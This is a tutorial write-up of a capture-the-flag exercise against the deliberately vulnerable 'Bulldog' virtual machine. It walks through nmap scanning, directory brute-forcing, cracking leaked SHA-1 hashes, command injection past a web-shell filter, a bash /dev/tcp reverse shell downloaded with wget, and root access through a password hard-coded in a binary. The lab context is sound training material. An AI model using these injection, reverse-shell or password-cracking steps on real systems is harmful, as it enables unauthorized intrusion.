[Main Page](index.md)


# From "What are CTF's?" to Your First Owned System
## Part 2: Taming the Bulldog

<br>

![A0 Logo](https://i.imgur.com/cqBVhbI.png)

<br>
### 23 January 2018


## Before We Start 


We've set up our VM's, connected them to each other and are ready to boot.
Let's get into "character"

*Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team.
Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)*


As a white-hat penetration testing team, we have been asked to test the new protections set up after the initial hacking.
This type of internal testing is broken up into to two groups: the Red Team and the Blue Team.
These choices loosely align with "offense" and "defense" respectively.
The defensive blue team has set up a system they believe is more secure than what it was before,
and it is our job as the red team to find out how true that is.



Our flag-capturing, root-accessing process will go something like this:
(Most of these are not widely used terms)

1.	Ensuring Connection
2.	Information Gathering - What does the box offer? Where should we look?
3.	External Observation/Reconnaissance  - Finding Vulnerable points from the outside
4.	Gaining Low-Privilege Access to the System - Attempting to gain access and pop a  "user" shell
5.	Internal Observation/Enumeration - finding vulnerable points from the inside
6.	Privilege Escalation - Gaining root access by via exploit, misconfiguration, or by taking advantage of privileged information insecurely stored.

The above process is NOT up to the standards used by professionals, and is not meant to be scalable.
It aims to simply demonstrate a general outline of the steps we need to perform in order to get the flag.
There are many standards for penetration testing, and the [Penetration Testing Execution Standard]( http://www.pentest-standard.org/index.php/Main_Page) is a good resource.



## 1. Getting Connected

### Locating the Target

Let's get our toolset warmed up and ready to work - boot up your Kali VM.
Upon boot, type `ifconfig` and ensure it has been automatically assigned a host-only IP address starting with `192.168.56.xx`


![A1](https://i.imgur.com/6VcSjXM.png)


Before we do the same for Bulldog, we want to make sure we don't miss an opportunity to learn something. 
Bulldog is set up to show us its host-only IP on start up.
We can look at this if we want to CONFIRM the IP, but why miss the opportunity to learn how to use Kali to identify it?


The Bulldog VM will run in the background even if we aren't looking at it and we will be interacting with it entirely through Kali.
Therefore, shortly after boot, we can simply minimize it.
If you accidentally view the IP, it isn't the end of the world.

### To keep the spoilers at a minimum, minimize Bulldog right after boot while the screen looks something like this:__

![A2_minimize_here](https://i.imgur.com/AYbLQ70.png)


Return to your Kali VM.
From this moment on, we will not need to exit it until Bulldog is conquered.

We know a little bit about our target system.
It is being run through Virtualbox and is connected to a network with addresses containing 192.168.56.xx. 
We also know our own system's IP.
These three pieces of information will allow us to find the IP of the target.


Time to meet your first tool: __nmap__
The __nmap__ network mapper is a fantastic tool for any kind of network interactions.
It can show you information computers on a network may "know" about one another,
but aren't necessarily obvious to the user.
Nmap can scan for vulnerabilities, identify software versions and so much more.

First, we will be using it to sniff out the Bulldog.

If you run `man nmap` you can spend some time reading about all the flags and many functions, but for now we just need one: `-sn`

The `-sn` flag tells nmap to just send a ping to each address in scope.
It will use your computer to send out calls to each of the addresses, and tell you if any of them respond.

Bulldog is hiding somewhere between 192.168.56.0 and 192.168.56.255, so let's scan that range. 
The syntax used for this is `192.168.56.0/24` 
`0/24`  is what is called "CIDR" notation, and for our purposes can be thought of as the range 0-255


We are ready to run nmap!


`nmap -sn 192.168.56.0/24`


![A3 - nmap -sn](https://i.imgur.com/K1FSnPm.png)



Nmap is able to read the unique hardware address of each device found.
It can look up the first parts of these addresses to associate each device with a possible manufacturer.
 In our case, we get two boxes with a network interface "manufactured by" VirtualBox. 


Since we only have two hits from VirtualBox machines, and we know our machine's IP, we know which one is Bulldog.

You may see two other devices that are not VirtualBoxes.
One of these is the Host OS itself, and the other is the host-only network's DHCP server.
The DHCP server automatically assigns IP addresses to the devices on our network.

### Adding Bulldog to Your Hosts File

It can be a bit cumbersome to type in 192.168.56.4 every single time, so we are going to set up a shortcut.

At /etc/hosts, we have a file that contains these "shortcuts."
If we add a line pointing our IP to a name like `bulldog.ctf` we can save ourselves some trouble.

__IF YOU MAKE A TYPO HERE - YOU CAN MESS UP YOUR SYSTEM!__

If you accidentally use `>` instead of `>>` - your host file will be overwritten!
This will require a manual fix - don't let it happen.


Add the IP address to your hosts file:

`echo "192.168.56.102 bulldog.ctf" >> /etc/hosts`


Run `ping bulldog.ctf` to see that your system has associated the address to the hostname `bulldog.ctf`


Let's create a working directory for our pentest, and we'll get started in earnest.

`mkdir bulldog && cd bulldog`




## 2. Information Gathering and Reconnaissance - What are we looking at?

### Enumerating Bulldog from the Outside

Now that we have found Bulldog's address, we have exhausted all the info we have. 
What IS Bulldog? Is it running a website? Hosting files? Can it run doom?

Nmap's `-sV` flag can answer all of these questions.

"Scan Versions" attempts to identify what services the box is running at what ports, and what software version it uses to do so.

`-F` enters "Fast" Mode - this only scans the Top 100 most popular ports.
This is usually enough to find something interesting. 
If none of these ports produce results, we can scan deeper and see if we find additional information


For all of our scans, we are also going to run a quick, hacky little logging method.


` COMMAND | tee COMMAND_output.txt`


will save our tool's outputs to a textfile in the `bulldog` directory - as long as it is our working directory.
If we wanted to write a report, repeat our process quickly, or just forget a result, it pays to have logs.


`nmap -sV -F bulldog.ctf | tee nmap_quickscan.txt`



![A4](https://i.imgur.com/Ml4Agfv.png)



This scan has already told us a lot of useful information:

* SSH (a secure remote command line) is running, but on a non-standard port. Normally SSH is port 22
* We know that the version of SSH it is running is for Ubuntu - we now know Bulldog is running Ubuntu!
* Ports 80 and 8080 are running HTTP - so there is a website for us to visit.
* The web hosting service is based on Python 2.7 - we now know Bulldog runs Python and using what version

Let's investigate the website in our browser.

![A5 website mainpage](https://i.imgur.com/2748dB7.png)

We can find the main page and the /notice page, but nothing on either seems particularly interesting.
We can view the sources on the pages, but nothing there jumps out at us either.


 ### Directory Bruteforcing 

We suspect there is more to this website than the 2 pages we have seen, but we haven't found any links to take us there.
There might be some pages like /mail, /login, or other common names, but we don't want to just type them in manually in the browser.

Enter `dirb` - a tool that will take a wordlist of common webpage names, append them to a URL and simply check if they exist
We can feed it different flags in order to do things like dig deeper, look for extensions like `.php` and more.

`dirb http://bulldog.ctf -r | tee dirb_result.txt`


The `-r` flag tells dirb NOT to search recursively. 
When you do your own CTFs, you may not want to enable this option, but we will use it here to demonstrate our process while keeping things light.


![A6](https://i.imgur.com/22yjLD9.png)


We get 3 hits - `/admin`, `/dev`, `/robots.txt`


### Probing the Website for Avenues of Attack

Let's start with `/robots.txt` - since that might contain the names of some restricted areas.
Ideally, a robots.txt file forbids certain webcrawlers from accessing the pages they list.
This might prevent a program like `dirb` from getting a complete result.
 
However, if we know there is a robots.txt, we can simply visit it in the browser and read the entries with our eyeballs.

![A7-robots](https://i.imgur.com/zz4dkIO.png)

The BlackHat German Shepherds have left the mark of a truly skilled hacker - ASCII ART!
There is nothing else here. It is just a .txt - so there is no source to view.

Let's check out `/admin`


![A8-admin](https://i.imgur.com/ZE0lbu3.png)


This page's existence gives us two key pieces of information
* The site can be logged into - this gives us a possible avenue of attack
* "Django" is a potentially useful term 

Even if you don't know what Django means in this context, useful terms like this may lead to productive searches in the future.

Some potentially interesting info lies in the page source, but there may be some lower hanging fruit on the /dev page.
It can be tempting to dive deeply into one aspect of a CTF right off the bat.
So far, my (somewhat limited) experience has shown that reconnaissance should focus on breadth before depth.



![A9](https://i.imgur.com/qzmkELJ.png) 

![A10](https://i.imgur.com/A5fuPXu.png)


This page is full of information, laid out for us by the designers themselves.
Here are the key points:

* The previous attackers had a good strategy, but odds are we won't be able to recreate it entirely.
* Several things are listed as NOT present: PHP, CMS (like Wordpress), MongoDB, etc. We can cross these off our our list of possibilities.
* SSH is available, in addition to a Web-Shell of their own design (linked to on the page)
* A custom-made program is in the works, but isn't finished yet
* A team hierarchy as well as contact information. If this were a real company, this could be used in social engineering.

If we try that big __Web-Shell__ link, all we find  is a message telling us told to log in.
This is a very interesting lead.
If we are able to log in as one of the users - we might get access to some sort of settings panel we can leverage.


Let's take a look at the /dev page source for clues.



![A11](https://i.imgur.com/FPEQrTa.png)


*"It's not like a hacker can do anything with a hash"*  sounds like an invitation to me!


## 3. Making Use of Password Hashes

Not only do we have a listing of contacts for each member of the company, but we have them paired with what appear to be password hashes!

### What are hashes?

Hashes are similar to, but are not encryption. 
When a user logs in to a system, the system will check their credentials against its database to see if the password is correct.
However, instead of storing the passwords in plaintext, the system stores them as "hashes."
To better explain this, we are going to use encryption as an analogy for hashing.


![A12](https://i.imgur.com/DlL3gAM.png)

Algorithms are often explained as black, white, or grey box.
A white box algorithm is completely understood and in this case, reversible.
Black is unknown entirely, and not reversible.
For our purposes, grey is somewhere in the middle.

Rot13 is white box because we understand and can easily perform every single step.
It is even its own reverse.
Since it affects individual letters, it also does not have what is called "avalanche" in cryptography.
If we alter one small part of a known plaintext, only one small part of the ciphertext will be changed.
`hello` rot13's to `urryb` while `jello` rot13's to `wrryb`.
The ciphertext will always be the exact length of the plaintext as well, which is very revealing.

The md5 hashing algorithm is not simple to understand, but it is openly published.
We can understand the process it uses, but it is very complicated and not feasible to reverse.
For this reason, we are calling it grey box. It also has very powerful avalanche, as demonstrated above.
md5 hashes are always the same length, no matter how long the plaintext is. 

As nice as md5 sounds, it is considered obsolete and vulnerable to dictionary and side channel attacks.
Unfortunately, it might be the most popular hashing algorithm in use today, in addition to SHA-1.

 
### How are these hashes used in the login process?

When a user enters in a password string, the system runs the hashing algorithm and stores the result.
The hash is compared with user's associated password hash, if it doesn't match, access is not granted.

![A13](https://i.imgur.com/Mfi7fNY.png)

![A14](https://i.imgur.com/fdII1L3.png)


### How is any of this relevant to Bulldog?

If an attacker were to somehow get a list of hashes, they could attempt to "reverse" the hashes using a dictionary attack.
This simple attack users the attacker's system to run the hashing algorithm on known words, and then compare the results to a list of acquired hashes.

![A15](https://i.imgur.com/auey4jB.png)


If a the hash of a known word matches a user's password hash, that word is the user's password.

Modern systems can perform this operation at speeds that would make Alan Turing faint.
A GPU-powered md5 dictionary attack can run billions of hashes per second.
However, the number of possible combinations of characters is essentially infinite.
The time it would take to brute force a reasonable set of possibilities may be unrealistic.
We will need to use a good wordlist and hope that one of our users is not very creative.


### Preparing the Dictionary Attack on Bulldog

In your terminal, run `gedit` to open up the text editor.

From the `/dev` page source, copy all lines containing hashes into the editor and save it as `raw_creds.txt` in your working directory.

![A16](blob:https://imgur.com/847ad189-c86a-4fc1-a7b8-243c06f04478) 

Then close gedit.

In order to use our dictionary attack tool, we need to format our credentials into `user:hash` format.

For the sake of time, I am going to show you a quick method of achieving this result from the command line based on the `cut` `paste` and `tr` commands.
If you'd like to understand them better, you can check out their `man` pages. 

* `cut` separates lines of text into columns based on a chosen character.
* `paste` takes lines from two text files and creates a single file of two columns - one column from each file.
* `tr` replaces one group of characters with those from another group. We only need to repalce one character.


First, we extract the hashes:

`cat raw_creds.txt | cut -d '!' -f 2 | cut -d '-' -f 3 > hashes.txt `

![A17](https://i.imgur.com/2uMnPVO.png)


Then, extract the users:

`cat raw_creds.txt | cut -d '<' -f 1 | cut -d ':' -f 2 > users.txt`

![A18](https://i.imgur.com/7M7kRiI.png)

Now we `paste` them together, and use `tr` to change the tab column separators with colons:

`paste users.txt hashes.txt | tr '\t' ':' > crackme.txt`

![A19](https://i.imgur.com/mHW4Tou.png)


Our file is ready, we just need to check what kind of hashes we are attempting to crack.

Copy one of the hashes, 

Try to access the web shell - we need to be logged in.

Copy one of the hashes, and then paste it into the hash identifying command `hashid`

`hashid '6515229daf8dbdc8b89fed2e60f10743'`

![A20](https://i.imgur.com/BWaysZi.png)

`hashid` tells us that our hashes are most likely. SHA-1, 
This is one of the  of the easier hashes to crack, and is about as old and insecure as md5.
Let's introduce our file to our friend John.


### Performing the Dictionary Attack Using John The Ripper

John The Ripper is one of the best tools out there for performing a dictionary attack.
It has a simple syntax and is often all we need when it comes to offline password recovery.
In this case, all we need to specify is what file we are attempting to crack, and what format to use.

`john crackme.txt --format=Raw-SHA1`


![A21](https://i.imgur.com/7UZ5tXD.png)

Very quickly, we get a result - and I can't say it is a surprising one.
This result will be stored, so we can interrupt john with `CTRL-C`


## 4. Gaining A Low-Privilege Shell

Let's go right for the most rewarding result and try to login to ssh.
 Our nmap scan told us that ssh was at a non-standard port, so we can check our logs to see which port we need to specify.

`ssh nick@bulldog.ctf -p 23`


This fails, but why not shoot for the moon and try to log in as root right away?


`ssh root@bulldog.ctf -p 23`


![A22](https://i.imgur.com/OEFXa42.png)


Oh well, didn't hurt to try.
SSH isn't our only place we can login. Let's try /admin

![A23](https://i.imgur.com/3StQZ38.png)

This works! We have site access.

*"You don't have permission to edit anything"* doesn't seem promising.
But now that we have logged in, let's try the webshell at /dev/shell

### Exploiting the Web-Shell

![A24](https://i.imgur.com/D00ch7i.png)

The shell claims that we can only run a list of "friendly" commands, and all commands are run directly on the server itself.
If we figure out how to allow arbitrary commands through, we can get the server to do our bidding.
All we need to do is bypass this filter process.


We can hypothesize that the command filtering employs some kind of simple *"if"* statement.
If a command contains one of the allowed commands, the server executes the inputted command.


Perhaps the `if` statement only checks to see if the input __contains__ one of the approved commands - not if the input is __only__ made up of approve commands.
If that is the case, we might be able to bypassthe filter by using an approved command immediately followed by an arbitrary command.
This would entail running two commands on the same line.


To check our theory, we need to prove two concepts:
* The Web-Shell Allows us to run multiple commands at a time
* The second command run does not need to be one of the approved commands


We know how to run commands on the same line using the `;` and `&&` characters, so let's give those a try.

In the webshell, run `ls; pwd`
Both of these commands are on the "nice" list, but before running some nasty commands we will need to prove our concept.


![A25](https://i.imgur.com/YgyHev2.png)


They've caught us! The computer police are on the way to arrest you now - thanks for playing.

Perhaps we can have more luck with `ls && pwd`

![A26](https://i.imgur.com/3z0kdps.png)

Let's try something unapproved, like `id`,  or `cd` .

In the webshell, run  `pwd && id && cd /tmp && pwd`

/tmp is a useful directory since all users have access to it by default - it is a great place for us to set up camp. 

If you know a little Linux, the word "sudo" will catch your eye in the image above.
We won't be needing to use that functionality here, and can privesc with other methods.


# A26.5! - oops! Forgot this screenie!

With our concepts proven, we can take advantage of our ability to excute code remotely.


## Our Shelling Process

Our goal now is to get Bulldog to run a "reverse shell" process.
This process allows us to use a Kali terminal window to remotely control Bulldog.


Our method of doing this will employ the incredibly useful `nc` tool.
When the reverse shell on Bulldog begins "talking,"  we will use `nc` to make sure Kali is "listening."
Then, the two systems can communicate freely and we can give orders directly to Bulldog.


There are many different kinds of reverse shells, and more ways to implement them.
After trial and error, I've found a method that is reliable, but entails more steps than the average reverse shell.
The Bulldog webshell is a bit limiting, but this process will circumvent these limitations and we will gain access.


Here is an overview of the process:
1. Save a single command that connects a reverse shell back to our Kali machine to a file - this is known as a script.
2. Use Kali as a web host, allowing Bulldog to download files from Kali
3. Run commands in the web shell to download the script to Bulldog
4. Run commands in the web shell to execute the script on Bulldog.
5. Bulldog begins talking, and Kali is set up to listen. Shell created.


I chose the port number `1234` because it was arbitrary and easy to remember.
You can use any number you like, as long as it doesn't overlap with other protocols (like HTTP at port 80).
Pentesters like to use ports 1337 and 31337 for fun.
I like to use port numbers 51000 and higher since they are not often assigned to a standard protocol.


#### Step 1 - Writing the Script

First, we need to create the script. 
This is as simple as writing the reverse shell script to a file that we give a `.sh` extension.

Run the following command on Kali in your `~/bulldog` directory.
Replace `KALI_IP` with Kali's Host-Only IP address - `192.168.56.xx`

` echo "bash -i >& /dev/tcp/KALI_IP/1234 0>&1" > script.sh 


#### Step 2 - Hosting the Script

Next, we need to set up Kali as a file server that Bulldog can download from.
Kali contains a built in method for doing this using Python.
We just have to provide a port number.

Again, run this inside `~/bulldog`

`python -m SimpleHTTPServer 1234`


![A27](https://i.imgur.com/dxMLenc.png)


Let this run, then go to the browser to run step 3.

#### Step 3 - Downloading the Script

The command we run through the webshell will need to download the script from Kali and make it executable.

We will need to break our command down into parts:
o	`pwd` to trick the if statement
o	`cd /tmp` to change to a directory where we have permission to download files
o	`wget  http://KALI_IP:1234/script.sh` to download to that directory
o	`chmod +x script.sh` to make the script executable

Run this in the webshell: 
`pwd && cd /tmp && wget http://KALI_IP:1234/script.sh && chmod +x script.sh`

![A28](https://i.imgur.com/QktUelE.png)


When you return to your Kali terminal window, you will see that the file has been accessed.

![A29](https://i.imgur.com/Z28B1JU.png)


### Step 4 - Stopping the Webserver and Starting the Listener

Kill the python hosting process with `CTRL-C`
We need will start up the `nc` listener.

o	`-l` tells `nc` to listen
o	`-n` tells `nc` to not bother trying to convert IP addresses into hostnames (like bulldog.ctf)
o	`-v` tells `nc` to be verbose - outputting more information for us to read
o	-p specifies at what port nc should run. This needs to match the port our shell script uses to connect to Kali.

`nc -lnvp 1234`

![A30](https://i.imgur.com/sFk1wOR.png)


#### Step 5 - Finally Popping the Shell

With Kali standing by listening, we just need Bulldog to start talking.

o	`pwd` to trick the if statement
o	`cd /tmp` to return us to the directory where the script is stored
o	`bash script.sh` to run it!

In the webshell run `pwd && cd /tmp && bash script.sh`

If it works, the browser window should say "connecting" but not actually load.


![A31](https://i.imgur.com/UCeeZW7.png)

Check your terminal window where you put in the `nc` command.
It will contain a command shell for `django@bulldog` !


![A32](https://i.imgur.com/9ULe19U.png)



## 5. Enumeration - Looking for Internal Weaknesses

This user shell is primitive, very primitive.
It does not have tab completion, `CTRL-C` and other bells and whistles our Kali shell has.
This shell can be upgraded, but we will only be doing that a little bit later on.
For this box, we can get by with a very primitive shell.


If you stop a process with `CTRL-C` - the shell is stopped instead. 
__If you need to restart your shell, simply repeat steps 4 and 5 of our shell process__


This CTF simulates a real-world experience, so we may see some common user missteps.
In reality, people can often leave important notes and reminders laying around.
These users would leave these things in a `/home` folder - or maybe in an email.


Let's see what we can see in the `/home` directory.


* `cd /home && ls`

We can see here that our website user, Nick, doesn't have a home folder on this machine.
This probably means the password we used so far is all used up.
There are folders for bulldogadmin and django, however.
Our shell, and the `id` command tells us that we ARE django, so we should have full access to this folder.
`bulldogadmin` sounds like it would contain some files we might find more interesting than what django has to offer.
Might as well check to see if `root_password_do_not_touch.txt` is inside - and if we can read it.


* `ls -l /home/bulldogadmin'

![A33](https://i.imgur.com/gqOMUvo.png)

Empty? That cant be. Perhaps that file is hidden?


* `ls -la /home/bulldogadmin`


![A34](https://i.imgur.com/x2xqQUh.png)


There are many hidden files here. Most of them are standard configuration files found in every user's folder by default, but not `.hiddenadmindirectory`  This folder is calling to us to take a closer look - let's have a look.

A period at the beginning of a file denotes a file is hidden, but it is also part of its name. If we want to enter this directory, all we need to do is include the period in our command. 

Let's enter this folder and list its contents - making sure we look for more hidden files.
 


* `cd /home/bulldogadmin/.hiddenadmindirectory && ls -a`


![A35](https://i.imgur.com/3gyKCu9.png)

A note? Could this be our `AdminPassNoHackersPlz.txt` file?

* `cat note`


*"...the webserver is the... ...one who needs to have root access..."* is all I needed to hear to get me interested.
 The other lines that got my attention were *"Once I'm finished with it, a hacker wouldn't even be able to reverse it,"*
 and *"...it's still a prototype right now."*

Maybe WE can reverse engineer it.



## 6. Reversing to Root

Reverse engineering can be a complicated process that would normally exceed the scope of this document.
But there are a few simple steps we can try that might be productive. 


The `customPermissionApp` isn't a text file, but is likely a compiled program.
We can confirm this with `file customPermissionApp` 
As a result, simply trying to read it with `cat` will show  binary characters that have the potential to crash our terminal and shell.
To get around this, we can use `strings`

`strings` is used to read files, but only outputs friendly, human readable characters to the terminal.
This file might be pretty long, however, so we should pipe it to the `less` command as well.
Unfortunately, our shell is too primitive at this stage to use `less`

We need what is called a `tty` which allows for more interactivity.
A reliable way of getting a tty uses python, which we know this webserver has since it is running a Django server. 


* `python -c 'import pty;pty.spawn("/bin/bash")`

This may throw out an error, but will still work.
The error comes from the `/bin/bash` part of our command, and is the same as the error we saw when we started the reverse shell. 


![A36](https://i.imgur.com/undefined.png)


We can now run our `strings` command and pipe it directly into `less`

* `strings customPermissionApp | less`

This *will* produce an error, saying `WARNING: terminal is not fully functional` This doesn't stop us from moving forward.


Now that we have isolated all the easily read characters, let's see if anything jumps out at us.

![A37]


The first thing I noticed was `sudo su root` at the bottom. If a user is set up as superuser, and runs this command, the system asks for their password, and then switches the terminal from user shell to a `root` shell. Note that the system does not asks for the `root` pass to upgrade a shell from user to root, but merely the superuser's password. `sudo su` doesn't run a single command as root, but __logs in__ as root. This is exactly what we want to achieve. 


We know that `sudo su` requires a password, but look at this line from the application:  `Usage: ./customPermissionApp <username>"` 

It doesn't appear to __ask__ for a password, does it? Also, the note mentioned that the application only set up to work for the Django user. 
Could this mean that the password for the Django user is hard-coded into the password itself?


We should read the whole file to try to find something, but let's start with the section we are already looking at. 


![A38 - supergood](https://i.imgur.com/wwMLiix.png)

Hmm, this isn't quite readable but we can make a guess out of it.

```
SUPERultH
imatePASH
SWORDyouH
CANTget
```

You know, if you dropped those pesky H's at the end, you would find `SUPERultimatePASSWORDyouCANTget` - could this be our "hidden" password?


.

Let's try it! 

* `sudo su`

password: SUPERultimatePASSWORDyouCANTget



![A31 shift+3](https://i.imgur.com/x9r9wRM.png)


We own this box now - we are the top (bull)dog!
We have access to all files, can change any passwords, install backdoors, and run amok as we please. 

If this were a real pentest, we may attempt to cover our tracks or use this box as a staging ground for accessing other machines on a network. A hacker might use this machine to serve their botnet, or as a proxy to commit actions that would be traced back to Bulldog Industries.

 
All we want to do is  go to the /root directory and grab the flag.

* `cd /root && ls
* `cat congrats.txt`


## Conclusion

I hope you had fun capturing your first flag!

If you want to get into more CTFs, I recommend [Vulnhub](https://www.vulnhub.com) and [HackTheBox](https://www.hackthebox.eu) as great platforms. 

Vulnhub maintains [this list of resources](https://www.vulnhub.com/resources/) which may serve as your launchpad for all things security.

CTFs are a fun way of testing your problem solving ability, learning a ton, and developing a skill that can blossom into a new career in cybersecurity.
Most importantly, they will help you develop the CTF *MINDSET*. 

This mindset is prevalent throughout the pentesting community and will be one of your greatest assets.


Here are a few pieces of this mindset:
* "Try harder." (This is the official advice of the OSCP Pentesting Certification)
* Be self-reliant. CTF writeups are one of the ONLY places you will be spoon fed ideas on how to move forward. If you approach a community of pentesters without showing your own independent efforts, there is an excellent chance you will simply be shown the door.
* If you don't know something, learn it. Search online, read some books, watch some tutorials and try again. 
* "How is this intended to be used? How can I do something unexpected?"
* "What would happen if I..."




